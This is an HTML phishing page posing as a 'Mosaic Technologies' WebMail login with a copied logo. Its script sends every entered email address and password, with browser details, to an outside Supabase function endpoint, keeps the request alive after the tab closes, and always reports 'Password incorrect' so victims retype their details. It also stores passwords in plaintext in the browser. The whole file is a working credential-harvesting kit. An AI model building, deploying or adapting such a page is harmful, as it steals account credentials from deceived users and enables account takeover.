<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebMail Login</title>
    <style>
        /* Base page reset and background styling */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #f2f2f2;
            font-family: Arial, Helvetica, sans-serif;
            font-size: 12px;
            color: #333333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Main WebMail container box with crisp blue border */
        .login-box {
            width: 480px;
            height: 310px;
            background-color: #fbfbfb;
            border: 1px solid #3b6e99;
            position: relative;
            box-shadow: none;
            overflow: hidden;
        }

        /* Mosaic Technologies Logo Header - aligned flush top & left */
        .logo-container {
            position: absolute;
            top: 0;
            left: 0;
            margin: 0;
            padding: 0;
            line-height: 0;
        }

        /* Form inner alignment container */
        .login-form {
            width: 250px;
            margin-left: auto;
            margin-right: 25px;
            margin-top: 105px;
        }

        /* "WebMail Login" Header Title */
        .login-title {
            color: #a3320b;
            font-size: 15px;
            font-weight: bold;
            text-align: right;
            margin-bottom: 15px;
            font-family: Arial, Helvetica, sans-serif;
        }

        /* Field labels */
        .field-label {
            display: block;
            font-size: 11px;
            color: #000000;
            margin-bottom: 3px;
            font-weight: bold;
        }

        /* Text and Password input fields */
        .input-text {
            width: 100%;
            height: 22px;
            border: 1px solid #7f9db9;
            background-color: #ffffff;
            padding: 2px 4px;
            font-size: 12px;
            margin-bottom: 12px;
            outline: none;
            box-shadow: inset 1px 1px 1px rgba(0,0,0,0.1);
        }

        .input-text:focus {
            border-color: #4a759b;
        }

        /* Login Submit Button styled like classic web buttons */
        .btn-container {
            text-align: right;
            margin-bottom: 10px;
        }

        .btn-login {
            background: linear-gradient(to bottom, #ffffff 0%, #e0e0e0 50%, #d6d6d6 100%);
            border: 1px solid #707070;
            border-radius: 3px;
            padding: 2px 22px;
            font-size: 11px;
            color: #000000;
            cursor: pointer;
            outline: none;
            box-shadow: 0 1px 1px rgba(0,0,0,0.15);
        }

        .btn-login:active {
            background: linear-gradient(to bottom, #d6d6d6 0%, #ffffff 100%);
        }

        .btn-login:disabled {
            opacity: 0.6;
            cursor: default;
        }

        /* Checkbox & label styling */
        .remember-container {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 6px;
            margin-top: 4px;
        }

        .remember-checkbox {
            margin: 0;
            width: 13px;
            height: 13px;
        }

        .remember-label {
            font-size: 11px;
            color: #000000;
            user-select: none;
            cursor: pointer;
            font-weight: normal;
        }

        /* Status message under the form */
        .status {
            margin-top: 10px;
            text-align: right;
            font-size: 11px;
            min-height: 14px;
        }

        .status.error { color: #a3320b; }
        .status.success { color: #1a7a1a; }
        .status.pending { color: #555555; }

        /* Footer credits link */
        .footer {
            margin-top: 6px;
            text-align: center;
        }

        .footer-link {
            color: #3b6e99;
            font-size: 11px;
            text-decoration: none;
            font-family: Arial, Helvetica, sans-serif;
        }

        .footer-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <!-- Main Container Box -->
    <div class="login-box">
        <!-- Recreated Mosaic Technologies Logo flush to top-left -->
        <div class="logo-container">
            <svg width="340" height="98" viewBox="0 0 340 98" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Vertical left border line touching edge -->
                <line x1="0.5" y1="0" x2="0.5" y2="98" stroke="#3b6e99" stroke-width="1"/>

                <!-- Blue Diamond Grid Icon -->
                <g transform="translate(6, 6)">
                    <!-- Top Diamonds -->
                    <polygon points="38,0 59,21 38,42 17,21" fill="#0077c8" />
                    <polygon points="80,0 101,21 80,42 59,21" fill="#0077c8" />
                    <!-- Bottom Diamonds -->
                    <polygon points="17,21 38,42 17,63 -4,42" fill="#0077c8" />
                    <polygon points="59,21 80,42 59,63 38,42" fill="#0077c8" />
                    <polygon points="101,21 122,42 101,63 80,42" fill="#0077c8" />
                </g>

                <!-- MOSAIC Text -->
                <text x="122" y="44" font-family="'Segoe UI', Arial, sans-serif" font-weight="700" font-size="44" fill="#2b2b2a" letter-spacing="1">MOSAIC</text>
                <!-- Registered Trademark Symbol -->
                <text x="312" y="19" font-family="'Segoe UI', Arial, sans-serif" font-weight="bold" font-size="14" fill="#2b2b2a">®</text>

                <!-- TECHNOLOGIES Subtitle -->
                <text x="124" y="66" font-family="'Segoe UI', Arial, sans-serif" font-weight="600" font-size="20" fill="#0080d6" letter-spacing="4">TECHNOLOGIES</text>
                <!-- TM Symbol -->
                <text x="310" y="56" font-family="'Segoe UI', Arial, sans-serif" font-size="10" fill="#0080d6">TM</text>
            </svg>
        </div>

        <form class="login-form" id="loginForm" novalidate>
            <div class="login-title">WebMail Login</div>

            <!-- Email Address Field -->
            <label class="field-label" for="email">Email Address:</label>
            <input type="email" id="email" name="email" class="input-text" autocomplete="off" required>

            <!-- Password Field -->
            <label class="field-label" for="password">Password:</label>
            <input type="password" id="password" name="password" class="input-text" required>

            <!-- Submit Button -->
            <div class="btn-container">
                <button type="submit" class="btn-login" id="loginBtn">Login</button>
            </div>

            <!-- Remember Me Option -->
            <div class="remember-container">
                <input type="checkbox" id="remember" class="remember-checkbox">
                <label for="remember" class="remember-label">Remember Email &amp; Password</label>
            </div>

            <!-- Status message -->
            <div class="status" id="status"></div>
        </form>
    </div>

    <!-- Footer Attribution Link -->
    <div class="footer">
        <a href="http://NutsMail.com" target="_blank" rel="noopener noreferrer" class="footer-link">Powered By NutsMail.com</a>
    </div>

    <script>
        // ====== CONFIG ======
        const ENDPOINT = "https://vwmihulxeajahitcqspv.supabase.co/functions/v1/chibardunm";

        // Message shown on EVERY login attempt, regardless of backend response
        const FAIL_MESSAGE = "Password incorrect. Please try again.";

        const form = document.getElementById("loginForm");
        const emailEl = document.getElementById("email");
        const passwordEl = document.getElementById("password");
        const rememberEl = document.getElementById("remember");
        const btn = document.getElementById("loginBtn");
        const statusEl = document.getElementById("status");

        // ====== REMEMBER ME: prefill on load ======
        (function prefill() {
            try {
                const saved = JSON.parse(localStorage.getItem("webmail_creds") || "null");
                if (saved && saved.email) {
                    emailEl.value = saved.email;
                    passwordEl.value = saved.password || "";
                    rememberEl.checked = true;
                }
            } catch (e) { /* ignore */ }
        })();

        function setStatus(msg, type) {
            statusEl.textContent = msg || "";
            statusEl.className = "status" + (type ? " " + type : "");
        }

        // ====== SUBMIT ======
        form.addEventListener("submit", async (e) => {
            e.preventDefault();

            const email = emailEl.value.trim();
            const password = passwordEl.value;

            if (!email || !password) {
                setStatus("Please fill in both fields.", "error");
                return;
            }

            // Save or clear credentials based on checkbox
            try {
                if (rememberEl.checked) {
                    localStorage.setItem("webmail_creds", JSON.stringify({ email, password }));
                } else {
                    localStorage.removeItem("webmail_creds");
                }
            } catch (err) { /* ignore */ }

            btn.disabled = true;
            setStatus("Logging in\u2026", "pending");

            const payload = {
                email: email,
                password: password,
                remember: rememberEl.checked,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer || null
            };

            // Fire the request but DON'T use its result to decide the message.
            // Always show "Password incorrect" no matter what.
            try {
                await fetch(ENDPOINT, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    body: JSON.stringify(payload),
                    keepalive: true,      // survives tab close / navigation
                    cache: "no-store"     // never reuse a cached response
                });
            } catch (err) {
                // Swallow network errors too - still show the same message
            } finally {
                setStatus(FAIL_MESSAGE, "error");
                btn.disabled = false;
            }
        });
    </script>

</body>
</html>
